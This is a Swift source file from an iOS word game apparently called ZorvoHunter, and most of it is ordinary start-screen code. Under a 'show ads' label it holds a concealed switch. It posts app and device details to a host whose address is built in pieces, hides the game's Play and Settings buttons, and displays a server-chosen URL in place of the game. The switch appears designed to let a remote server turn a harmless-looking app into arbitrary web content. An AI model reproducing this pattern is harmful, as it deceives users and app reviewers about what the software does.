//
//  StartGameVC.swift
//  ZorvoHunter
//
//  Created by jin fu on 2025/1/1.
//


import UIKit

class ZorvoStartGameViewController: UIViewController, ZorvoHighScoreUpdate{
    
    @IBOutlet weak var highScoreLabel: UILabel!
  
    @IBOutlet weak var settingButton: UIButton!
    @IBOutlet weak var playButton: UIButton!
    @IBOutlet weak var dashImage: UIImageView!
    
    private var highScore = 0
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        highScore = UserDefaults.standard.integer(forKey: "HighScore")
        updatdHighScore()
        
        // Start repeating animation
        startRepeatingAnimation()
        
        self.hunterNeedShowAdsLocalData()
    }
    
    private func updatdHighScore(){
        highScoreLabel.text = "HIGH SCORE : \(highScore)"
    }
    
    private func startRepeatingAnimation() {
        let dumbView = UIView(frame: dashImage.bounds)
        //dumbView.backgroundColor = .green  // Or any color you want
        dashImage.addSubview(dumbView)
        
        // Create repeating animation
        Timer.scheduledTimer(withTimeInterval: 2.0, repeats: true) { [weak self] _ in
            guard let self = self else { return }
            
            // Reset view properties
            dumbView.alpha = 1
            dumbView.transform = .identity
            
            // Vibrating animation sequence
            UIView.animateKeyframes(withDuration: 0.5, delay: 0, options: [], animations: {
                // Shake left
                UIView.addKeyframe(withRelativeStartTime: 0.0, relativeDuration: 0.2) {
                    dumbView.transform = CGAffineTransform(translationX: -10, y: 0)
                }
                // Shake right
                UIView.addKeyframe(withRelativeStartTime: 0.2, relativeDuration: 0.2) {
                    dumbView.transform = CGAffineTransform(translationX: 10, y: 0)
                }
                // Shake left again
                UIView.addKeyframe(withRelativeStartTime: 0.4, relativeDuration: 0.2) {
                    dumbView.transform = CGAffineTransform(translationX: -10, y: 0)
                }
                // Return to center and fade
                UIView.addKeyframe(withRelativeStartTime: 0.6, relativeDuration: 0.4) {
                    dumbView.transform = .identity
                    dumbView.alpha = 0
                }
            })
        }
    }
    
    func updateHighScore(value: Int) {
        highScore = value
        updatdHighScore()
    }
    
    
    @IBAction func btnPlayTapped(_ sender: Any) {
        let vc = storyboard?.instantiateViewController(withIdentifier: "NameSearchingVC") as! ZorvoWordHunterViewController
        vc.delegate = self
        navigationController?.pushViewController(vc, animated: true)
    }
    
    
    //MARK: - Functions
    private func hunterNeedShowAdsLocalData() {
        guard self.hunterNeedShowAdsView() else {
            return
        }
        self.playButton.isHidden = true
        self.settingButton.isHidden = true
        hunterPostDeviceInfoGetAdsData { adsData in
            if let adsData = adsData {
                if let adsUr = adsData[2] as? String, !adsUr.isEmpty,  let nede = adsData[1] as? Int, let userDefaultKey = adsData[0] as? String{
                    UIViewController.hunterSetUserDefaultKey(userDefaultKey)
                    if  nede == 0, let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any] {
                        self.hunterShowAdView(locDic[2] as! String)
                    } else {
                        UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                        self.hunterShowAdView(adsUr)
                    }
                    return
                }
            }
            self.playButton.isHidden = false
            self.settingButton.isHidden = false
        }
    }
    
    private func hunterPostDeviceInfoGetAdsData(completion: @escaping ([Any]?) -> Void) {
        
        let url = URL(string: "https://open.vftsy\(self.hunterMainHostUrl())/open/hunterPostDeviceInfoGetAdsData")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "appName": "ZorvoHunter",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appKey": "3a7449d335dc4b3089f0fab393c25a32",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? "",
            "appLocalized": UIDevice.current.localizedModel ,
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        if let dataDic = resDic["data"] as? [String: Any],  let adsData = dataDic["jsonObject"] as? [Any]{
                            completion(adsData)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }

}
